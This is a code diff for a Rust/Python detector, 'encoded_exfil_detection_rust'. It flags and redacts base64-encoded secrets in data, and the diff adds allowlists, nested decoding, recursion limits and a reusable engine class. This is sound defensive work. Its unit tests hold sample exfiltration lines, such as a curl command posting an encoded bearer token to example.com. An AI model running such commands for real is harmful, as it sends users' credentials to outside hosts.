@@ -66,6 +66,13 @@ struct DetectorConfig {
     max_findings_per_value: usize,
     redact: bool,
     redaction_text: String,
+    allowlist_patterns: Vec<Regex>,
+    extra_sensitive_keywords: Vec<Vec<u8>>,
+    extra_egress_hints: Vec<String>,
+    max_decode_depth: usize,
+    max_recursion_depth: usize,
+    per_encoding_score: HashMap<String, u32>,
+    parse_json_strings: bool,
 }
 
 impl Default for DetectorConfig {
@@ -88,6 +95,13 @@ impl Default for DetectorConfig {
             max_findings_per_value: 50,
             redact: false,
             redaction_text: "***ENCODED_REDACTED***".to_string(),
+            allowlist_patterns: Vec::new(),
+            extra_sensitive_keywords: Vec::new(),
+            extra_egress_hints: Vec::new(),
+            max_decode_depth: 2,
+            max_recursion_depth: 32,
+            per_encoding_score: HashMap::new(),
+            parse_json_strings: true,
         }
     }
 }
@@ -158,6 +172,66 @@ impl<'py> TryFrom<&Bound<'py, PyAny>> for DetectorConfig {
             .and_then(|v| v.extract::<String>().ok())
             .unwrap_or(default.redaction_text.clone());
 
+        let allowlist_raw: Vec<String> = obj
+            .getattr("allowlist_patterns")
+            .ok()
+            .and_then(|v| v.extract::<Vec<String>>().ok())
+            .unwrap_or_default();
+        let mut allowlist_patterns = Vec::with_capacity(allowlist_raw.len());
+        for pattern in &allowlist_raw {
+            match Regex::new(pattern) {
+                Ok(re) => allowlist_patterns.push(re),
+                Err(e) => {
+                    return Err(pyo3::exceptions::PyValueError::new_err(format!(
+                        "Invalid allowlist regex pattern '{}': {}",
+                        pattern, e
+                    )));
+                }
+            }
+        }
+
+        let extra_sensitive_keywords = obj
+            .getattr("extra_sensitive_keywords")
+            .ok()
+            .and_then(|v| v.extract::<Vec<String>>().ok())
+            .unwrap_or_default()
+            .into_iter()
+            .map(|kw| kw.to_lowercase().into_bytes())
+            .collect();
+
+        let extra_egress_hints = obj
+            .getattr("extra_egress_hints")
+            .ok()
+            .and_then(|v| v.extract::<Vec<String>>().ok())
+            .unwrap_or_default()
+            .into_iter()
+            .map(|h| h.to_lowercase())
+            .collect();
+
+        let max_decode_depth = obj
+            .getattr("max_decode_depth")
+            .ok()
+            .and_then(|v| v.extract::<usize>().ok())
+            .unwrap_or(default.max_decode_depth);
+
+        let max_recursion_depth = obj
+            .getattr("max_recursion_depth")
+            .ok()
+            .and_then(|v| v.extract::<usize>().ok())
+            .unwrap_or(default.max_recursion_depth);
+
+        let per_encoding_score = obj
+            .getattr("per_encoding_score")
+            .ok()
+            .and_then(|v| v.extract::<HashMap<String, u32>>().ok())
+            .unwrap_or_default();
+
+        let parse_json_strings = obj
+            .getattr("parse_json_strings")
+            .ok()
+            .and_then(|v| v.extract::<bool>().ok())
+            .unwrap_or(default.parse_json_strings);
+
         Ok(Self {
             enabled,
             min_encoded_length,
@@ -169,6 +243,13 @@ impl<'py> TryFrom<&Bound<'py, PyAny>> for DetectorConfig {
             max_findings_per_value,
             redact,
             redaction_text,
+            allowlist_patterns,
+            extra_sensitive_keywords,
+            extra_egress_hints,
+            max_decode_depth,
+            max_recursion_depth,
+            per_encoding_score,
+            parse_json_strings,
         })
     }
 }
@@ -297,51 +378,65 @@ fn printable_ratio(data: &[u8]) -> f64 {
     printable as f64 / data.len() as f64
 }
 
-fn has_sensitive_keywords(decoded: &[u8]) -> bool {
+fn has_sensitive_keywords(decoded: &[u8], extra_keywords: &[Vec<u8>]) -> bool {
     let lowered = decoded
         .iter()
         .map(|byte| byte.to_ascii_lowercase())
         .collect::<Vec<u8>>();
 
-    SENSITIVE_KEYWORDS.iter().any(|keyword| {
+    let builtin_match = SENSITIVE_KEYWORDS.iter().any(|keyword| {
         lowered
             .windows(keyword.len())
             .any(|window| window == *keyword)
+    });
+    if builtin_match {
+        return true;
+    }
+    extra_keywords.iter().any(|keyword| {
+        if keyword.is_empty() {
+            return false;
+        }
+        lowered
+            .windows(keyword.len())
+            .any(|window| window == keyword.as_slice())
     })
 }
 
-fn has_egress_context(text: &str, start: usize, end: usize) -> bool {
+fn has_egress_context(text: &str, start: usize, end: usize, extra_hints: &[String]) -> bool {
     let lower = text.to_lowercase();
     let bytes = lower.as_bytes();
     let left = start.saturating_sub(80);
     let right = (end + 80).min(bytes.len());
     let window = String::from_utf8_lossy(&bytes[left..right]);
-    EGRESS_HINTS.iter().any(|hint| window.contains(hint))
+    if EGRESS_HINTS.iter().any(|hint| window.contains(hint)) {
+        return true;
+    }
+    extra_hints
+        .iter()
+        .any(|hint| !hint.is_empty() && window.contains(hint.as_str()))
 }
 
 /// Validate that a match has proper word boundaries (not part of a larger alphanumeric sequence)
 /// This prevents false positives and allows adjacent matches without consuming boundary chars
 fn has_valid_boundaries(text: &str, start: usize, end: usize, core_chars: &str) -> bool {
     let bytes = text.as_bytes();
+    // Exclude '=' from boundary check — it's only valid as padding at the end of base64,
+    // and the regex already captures trailing padding as part of the match.
+    let boundary_chars = core_chars.replace('=', "");
 
     // Check character before match (if exists)
-    // Note: '=' is only valid as padding at the END of base64, not before it
     if start > 0 {
         let prev_char = bytes[start - 1] as char;
-        // Exclude '=' from boundary check since it's only valid as padding at the end
-        let boundary_chars = core_chars.replace('=', "");
         if boundary_chars.contains(prev_char) {
-            return false; // Previous char is part of the core pattern alphabet
+            return false;
         }
     }
 
     // Check character after match (if exists)
     if end < bytes.len() {
         let next_char = bytes[end] as char;
-        // Exclude '=' from boundary check since it's only valid as padding at the end
-        let boundary_chars = core_chars.replace('=', "");
         if boundary_chars.contains(next_char) {
-            return false; // Next char is part of the core pattern alphabet
+            return false;
         }
     }
 
@@ -368,8 +463,8 @@ fn evaluate_candidate(
 
     let entropy = shannon_entropy(&decoded);
     let printable = printable_ratio(&decoded);
-    let sensitive_hit = has_sensitive_keywords(&decoded);
-    let egress_hit = has_egress_context(text, start, end);
+    let sensitive_hit = has_sensitive_keywords(&decoded, &cfg.extra_sensitive_keywords);
+    let egress_hit = has_egress_context(text, start, end, &cfg.extra_egress_hints);
 
     let mut score = 1u32;
     let mut reasons = vec!["decodable".to_string()];
@@ -399,7 +494,12 @@ fn evaluate_candidate(
         reasons.push("long_segment".to_string());
     }
 
-    if score < cfg.min_suspicion_score {
+    let threshold = cfg
+        .per_encoding_score
+        .get(encoding)
+        .copied()
+        .unwrap_or(cfg.min_suspicion_score);
+    if score < threshold {
         return None;
     }
 
@@ -443,7 +543,12 @@ fn apply_redactions(text: &str, findings: &[Finding], replacement: &str) -> Stri
     redacted
 }
 
-fn scan_text(text: &str, path: &str, cfg: &DetectorConfig) -> (String, Vec<Finding>) {
+fn scan_text(
+    text: &str,
+    path: &str,
+    cfg: &DetectorConfig,
+    decode_depth: usize,
+) -> (String, Vec<Finding>) {
     if text.is_empty() || text.len() > cfg.max_scan_string_length {
         return (text.to_string(), vec![]);
     }
@@ -474,20 +579,48 @@ fn scan_text(text: &str, path: &str, cfg: &DetectorConfig) -> (String, Vec<Findi
         for matched in regex.find_iter(text) {
             let start = matched.start();
             let end = matched.end();
+            let candidate = matched.as_str();
 
             // Validate boundaries for encodings that need it
             if !valid_chars.is_empty() && !has_valid_boundaries(text, start, end, valid_chars) {
                 continue;
             }
 
-            if let Some(finding) =
-                evaluate_candidate(text, path, encoding, matched.as_str(), start, end, cfg)
+            // Check allowlist — skip candidates matching any allowlist pattern
+            if cfg
+                .allowlist_patterns
+                .iter()
+                .any(|ap| ap.is_match(candidate))
             {
-                let key = (finding.start, finding.end);
+                continue;
+            }
+
+            let mut finding = evaluate_candidate(text, path, encoding, candidate, start, end, cfg);
+
+            // Try nested decoding — peel encoding layers to find deeper secrets
+            if decode_depth < cfg.max_decode_depth.saturating_sub(1)
+                && let Some(decoded) = decode_candidate(encoding, candidate)
+                && decoded.len() >= cfg.min_decoded_length
+            {
+                let decoded_text = String::from_utf8_lossy(&decoded);
+                let (_, nested_findings) = scan_text(&decoded_text, path, cfg, decode_depth + 1);
+                for nf in nested_findings {
+                    let use_nested = match &finding {
+                        Some(f) => nf.score > f.score,
+                        None => true,
+                    };
+                    if use_nested {
+                        finding = Some(Finding { start, end, ..nf });
+                    }
+                }
+            }
+
+            if let Some(f) = finding {
+                let key = (f.start, f.end);
                 match findings_by_span.get(&key) {
-                    Some(existing) if existing.score >= finding.score => {}
+                    Some(existing) if existing.score >= f.score => {}
                     _ => {
-                        findings_by_span.insert(key, finding);
+                        findings_by_span.insert(key, f);
                     }
                 }
 
@@ -509,6 +642,37 @@ fn scan_text(text: &str, path: &str, cfg: &DetectorConfig) -> (String, Vec<Findi
         apply_redactions(text, &findings, &cfg.redaction_text),
         findings,
     )
+}
+
+fn json_value_to_py<'py>(py: Python<'py>, val: &serde_json::Value) -> PyResult<Bound<'py, PyAny>> {
+    match val {
+        serde_json::Value::String(s) => Ok(PyString::new(py, s).into_any()),
+        serde_json::Value::Object(map) => {
+            let dict = PyDict::new(py);
+            for (k, v) in map {
+                dict.set_item(k, json_value_to_py(py, v)?)?;
+            }
+            Ok(dict.into_any())
+        }
+        serde_json::Value::Array(arr) => {
+            let list = PyList::empty(py);
+            for v in arr {
+                list.append(json_value_to_py(py, v)?)?;
+            }
+            Ok(list.into_any())
+        }
+        serde_json::Value::Number(n) => {
+            if let Some(i) = n.as_i64() {
+                Ok(i.into_pyobject(py)?.into_any())
+            } else if let Some(f) = n.as_f64() {
+                Ok(f.into_pyobject(py)?.into_any())
+            } else {
+                Ok(py.None().into_bound(py).into_any())
+            }
+        }
+        serde_json::Value::Bool(b) => Ok(b.into_pyobject(py)?.to_owned().into_any()),
+        serde_json::Value::Null => Ok(py.None().into_bound(py).into_any()),
+    }
 }
 
 fn finding_to_dict<'py>(py: Python<'py>, finding: &Finding) -> PyResult<Bound<'py, PyDict>> {
@@ -535,17 +699,58 @@ fn scan_container<'py>(
     container: &Bound<'py, PyAny>,
     path: &str,
     cfg: &DetectorConfig,
+    depth: usize,
 ) -> PyResult<(usize, Bound<'py, PyAny>, Bound<'py, PyList>)> {
-    if let Ok(text) = container.extract::<String>() {
-        let (redacted_text, findings) = scan_text(&text, path, cfg);
-        let findings_list = PyList::empty(py);
+    if depth > cfg.max_recursion_depth {
+        return Ok((0, container.clone(), PyList::empty(py)));
+    }
 
+    if let Ok(text) = container.extract::<String>() {
+        // Scan as raw text first — always returns the original type (string)
+        let (redacted_text, findings) = scan_text(&text, path, cfg, 0);
+        let findings_list = PyList::empty(py);
         for finding in &findings {
             findings_list.append(finding_to_dict(py, finding)?)?;
         }
 
+        // Try parsing string as JSON for additional findings (metadata only, no type mutation)
+        // Heuristic: only attempt JSON parse if string starts with { or [ and is within size limit
+        if cfg.parse_json_strings
+            && depth < cfg.max_recursion_depth
+            && text.len() <= cfg.max_scan_string_length
+            && text.len() >= 2
+            && (text.starts_with('{') || text.starts_with('['))
+            && let Ok(parsed) = serde_json::from_str::<serde_json::Value>(&text)
+            && (parsed.is_object() || parsed.is_array())
+        {
+            let json_path = if path.is_empty() {
+                "(json)".to_string()
+            } else {
+                format!("{}(json)", path)
+            };
+            let py_parsed = json_value_to_py(py, &parsed)?;
+            let (_, _, json_findings) = scan_container(py, &py_parsed, &json_path, cfg, depth + 1)?;
+            // Deduplicate: only add JSON findings whose encoded match isn't already in raw scan
+            let raw_matches: std::collections::HashSet<String> =
+                findings.iter().map(|f| f.matched_preview.clone()).collect();
+            for item in json_findings.iter() {
+                if let Ok(dict) = item.cast::<PyDict>() {
+                    let preview = dict
+                        .get_item("match")
+                        .ok()
+                        .flatten()
+                        .and_then(|v| v.extract::<String>().ok())
+                        .unwrap_or_default();
+                    if !raw_matches.contains(&preview) {
+                        findings_list.append(item)?;
+                    }
+                }
+            }
+        }
+
+        let total_findings = findings_list.len();
         return Ok((
-            findings.len(),
+            total_findings,
             PyString::new(py, &redacted_text).into_any(),
             findings_list,
         ));
@@ -559,13 +764,23 @@ fn scan_container<'py>(
         for (key, value) in dict.iter() {
             let key_str = key.str()?.to_string_lossy().into_owned();
             let child_path = if path.is_empty() {
-                key_str
+                key_str.clone()
             } else {
                 format!("{}.{}", path, key_str)
             };
 
+            // Scan keys that are long enough to contain encoded content
+            if key_str.len() >= cfg.min_encoded_length {
+                let key_path = format!("{}(key)", child_path);
+                let (_, key_findings) = scan_text(&key_str, &key_path, cfg, 0);
+                for kf in &key_findings {
+                    all_findings.append(finding_to_dict(py, kf)?)?;
+                }
+                total += key_findings.len();
+            }
+
             let (count, redacted_value, child_findings) =
-                scan_container(py, &value, &child_path, cfg)?;
+                scan_container(py, &value, &child_path, cfg, depth + 1)?;
             total += count;
             for item in child_findings.iter() {
                 all_findings.append(item)?;
@@ -588,7 +803,7 @@ fn scan_container<'py>(
                 format!("{}[{}]", path, index)
             };
             let (count, redacted_item, child_findings) =
-                scan_container(py, &item, &child_path, cfg)?;
+                scan_container(py, &item, &child_path, cfg, depth + 1)?;
             total += count;
             for finding in child_findings.iter() {
                 all_findings.append(finding)?;
@@ -602,6 +817,33 @@ fn scan_container<'py>(
     Ok((0, container.clone(), PyList::empty(py)))
 }
 
+/// Persistent engine that parses config once at init and reuses it across scans.
+#[gen_stub_pyclass]
+#[pyclass]
+struct ExfilDetectorEngine {
+    cfg: DetectorConfig,
+}
+
+#[gen_stub_pymethods]
+#[pymethods]
+impl ExfilDetectorEngine {
+    #[new]
+    fn new(config: Bound<'_, PyAny>) -> PyResult<Self> {
+        let cfg = DetectorConfig::try_from(&config)?;
+        Ok(Self { cfg })
+    }
+
+    /// Scan a container using the pre-parsed config. No per-call config parsing.
+    fn scan<'py>(
+        &self,
+        py: Python<'py>,
+        container: Bound<'py, PyAny>,
+    ) -> PyResult<(usize, Bound<'py, PyAny>, Bound<'py, PyList>)> {
+        scan_container(py, &container, "", &self.cfg, 0)
+    }
+}
+
+/// Backward-compatible bare function — creates a temporary engine per call.
 #[gen_stub_pyfunction]
 #[pyfunction]
 fn py_scan_container<'py>(
@@ -610,11 +852,12 @@ fn py_scan_container<'py>(
     config: Bound<'py, PyAny>,
 ) -> PyResult<(usize, Bound<'py, PyAny>, Bound<'py, PyList>)> {
     let cfg = DetectorConfig::try_from(&config)?;
-    scan_container(py, &container, "", &cfg)
+    scan_container(py, &container, "", &cfg, 0)
 }
 
 #[pymodule]
 fn encoded_exfil_detection_rust(m: &Bound<'_, PyModule>) -> PyResult<()> {
+    m.add_class::<ExfilDetectorEngine>()?;
     m.add_function(wrap_pyfunction!(py_scan_container, m)?)?;
     Ok(())
 }
@@ -631,7 +874,7 @@ mod tests {
         let cfg = DetectorConfig::default();
         let encoded = STANDARD.encode(b"authorization: bearer abcdefghijklmnop");
         let text = format!("curl -d '{}' https://example.com", encoded);
-        let (_, findings) = scan_text(&text, "args.payload", &cfg);
+        let (_, findings) = scan_text(&text, "args.payload", &cfg, 0);
 
         assert_eq!(findings.len(), 1);
         assert_eq!(findings[0].encoding, "base64");
@@ -648,7 +891,7 @@ mod tests {
 
         let encoded = STANDARD.encode(b"password=my-secret-value");
         let text = format!("data={}", encoded);
-        let (redacted, findings) = scan_text(&text, "", &cfg);
+        let (redacted, findings) = scan_text(&text, "", &cfg, 0);
 
         assert_eq!(findings.len(), 1);
         assert!(redacted.contains("[REDACTED]"));
@@ -659,7 +902,7 @@ mod tests {
     fn test_scan_text_ignores_short_candidates() {
         let cfg = DetectorConfig::default();
         let text = "token=YWJjZA==";
-        let (_, findings) = scan_text(text, "", &cfg);
+        let (_, findings) = scan_text(text, "", &cfg, 0);
         assert!(findings.is_empty());
     }
 
@@ -670,7 +913,7 @@ mod tests {
         let encoded1 = STANDARD.encode(b"password=secret-value-one");
         let encoded2 = STANDARD.encode(b"token=secret-value-two");
         let text = format!("[{}] [{}]", encoded1, encoded2);
-        let (_, findings) = scan_text(&text, "", &cfg);
+        let (_, findings) = scan_text(&text, "", &cfg, 0);
 
         // Both base64 strings should be detected
         assert_eq!(
@@ -682,5 +925,63 @@ mod tests {
         // Verify they are distinct matches
         assert_ne!(findings[0].start, findings[1].start);
         assert_ne!(findings[0].end, findings[1].end);
+    }
+
+    #[test]
+    fn test_nested_base64_detection() {
+        let inner = STANDARD.encode(b"password=super-secret-credential-value");
+        let outer = STANDARD.encode(inner.as_bytes());
+        let cfg = DetectorConfig {
+            max_decode_depth: 2,
+            min_suspicion_score: 4,
+            ..DetectorConfig::default()
+        };
+        let (_, findings) = scan_text(&outer, "", &cfg, 0);
+        assert!(
+            !findings.is_empty(),
+            "Double-encoded base64 should be detected"
+        );
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.reason.contains(&"sensitive_keywords".to_string())),
+            "Inner layer sensitive_keywords should be found"
+        );
+    }
+
+    #[test]
+    fn test_allowlist_skips_matching_candidate() {
+        let encoded = STANDARD.encode(b"authorization: bearer super-secret-token-value");
+        let cfg = DetectorConfig {
+            allowlist_patterns: vec![Regex::new(&encoded[..16]).unwrap()],
+            ..DetectorConfig::default()
+        };
+        let text = format!("curl -d '{}' https://example.com", encoded);
+        let (_, findings) = scan_text(&text, "", &cfg, 0);
+        assert!(
+            findings.is_empty(),
+            "Allowlisted pattern should not produce findings"
+        );
+    }
+
+    #[test]
+    fn test_extra_sensitive_keywords() {
+        let encoded = STANDARD.encode(b"watsonx_cred=xq7m9Rk2vLpN3wJfHbYd8sTc");
+        let cfg = DetectorConfig {
+            extra_sensitive_keywords: vec![b"watsonx_cred".to_vec()],
+            min_suspicion_score: 1,
+            ..DetectorConfig::default()
+        };
+        let (_, findings) = scan_text(&encoded, "", &cfg, 0);
+        assert!(
+            !findings.is_empty(),
+            "Extra keyword should trigger detection"
+        );
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.reason.contains(&"sensitive_keywords".to_string())),
+            "sensitive_keywords reason should be present"
+        );
     }
 }
